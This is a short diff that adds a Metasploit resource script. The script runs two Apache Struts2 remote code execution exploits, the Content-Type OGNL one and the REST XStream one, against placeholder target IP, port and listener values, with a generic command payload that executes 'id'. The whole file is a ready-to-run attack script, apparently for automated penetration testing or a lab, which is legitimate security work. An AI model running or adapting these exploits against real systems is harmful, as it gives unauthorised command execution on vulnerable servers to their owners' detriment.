@@ -1,0 +1,15 @@
+use exploit/multi/http/struts2_content_type_ognl
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set LHOST %%LHOST%%
+set PAYLOAD cmd/unix/generic
+set CMD id
+run
+
+use exploit/multi/http/struts2_rest_xstream
+set RHOSTS %%TARGET_IP%%
+set RPORT %%TARGET_PORT%%
+set LHOST %%LHOST%%
+set PAYLOAD cmd/unix/generic
+set CMD id
+run
